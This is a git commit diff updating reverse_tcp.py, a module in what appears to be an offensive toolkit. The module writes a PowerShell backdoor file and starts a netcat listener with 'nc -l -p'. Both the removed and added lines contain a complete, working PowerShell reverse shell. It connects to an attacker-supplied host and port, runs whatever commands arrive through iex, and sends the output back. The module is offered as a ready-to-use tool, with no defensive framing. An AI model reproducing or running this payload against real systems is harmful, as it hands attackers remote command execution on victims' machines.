8c02db7f44ef0a675b9079c82d38bc6ca7a0263c
Amer Araibia <46226856+ameraraibia168@users.noreply.github.com>
2024-07-13 11:48:51 +0100

    Update reverse_tcp.py

--- waf/modules/payloads/nc/ps/reverse_tcp.py
+++ waf/modules/payloads/nc/ps/reverse_tcp.py
@@ -9,19 +9,19 @@ info = {
         "description" : "Payload creation and exploitation"
 }
 
-var.lname = ["payload.ps1"]
-var.ltype = ["listen"]
+var.all_var['lname'] = "payload.ps1"
+var.all_var['ltype'] = "listen"
 
 options ={
-  "LHOST" : [str(var.lhost[0]),'The listen address'],
-  "LPORT" : [str(var.lport[0]),'The listen port'],
-  "LNAME" : [str(var.lname[0]),'The name of payload'],
-  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
+  "LHOST" : [str(var.all_var['lhost']),'The listen address'],
+  "LPORT" : [str(var.all_var['lport']),'The listen port'],
+  "LNAME" : [str(var.all_var['lname']),'The name of payload'],
+  "LTYPE" : [str(var.all_var['ltype']),'Choose listen or create <listen / create>']
 }
 
 def running():
     try:
-        if var.ltype == "CREATE" or var.ltype[0] == "create":
+        if var.all_var['ltype'].lower() == "create":
             print ("")
             print (blue+"[*]"+default+ "Create a backdour")
             time.sleep(2)
@@ -33,17 +33,16 @@ def running():
             print ("")
             mark  = '"'
             mark2 = ','
-            f = open(var.lname[0] , 'w')
+            f = open(var.all_var['lname'] , 'w')
             payload = '''
-$client = New-Object System.Net.Sockets.TCPClient( '''+mark+var.lhost[0]+mark+mark2+var.lport[0]+''' );$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient( '''+mark+var.all_var['lhost']+mark+mark2+var.all_var['lport']+''' );$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 '''
             f.write(payload)
             f.close()
 
-        elif var.ltype[0] == "LISTEN" or var.ltype[0] == "listen":
-            os.system("nc -l -p "+str(var.lport[0])+" -v")
-
+        elif var.all_var['ltype'].lower() == "listen":
+            os.system("nc -l -p "+str(var.all_var['lport'])+" -v")
 
         else:
             print (red+"[-]"+default+"Choose LTYPE " )
